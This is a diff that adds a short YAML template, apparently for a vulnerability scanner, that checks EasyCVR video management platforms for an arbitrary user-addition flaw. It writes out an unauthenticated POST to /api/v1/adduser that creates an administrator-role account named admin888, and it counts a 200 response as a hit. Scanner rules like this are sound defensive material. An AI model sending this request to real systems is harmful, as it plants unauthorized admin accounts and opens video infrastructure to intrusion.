@@ -1,0 +1,18 @@
+id:
+info:
+  name: EasyCVR视频管理平台任意用户添加漏洞
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /api/v1/adduser
+  data: |
+    name=admin888&username=admin888&password=0e7517141fb53f21ee439b355b5a1d0a&roleid=1
+response1:
+  headers:
+  body: succes
+  code: 200
+requests2:
+response2:
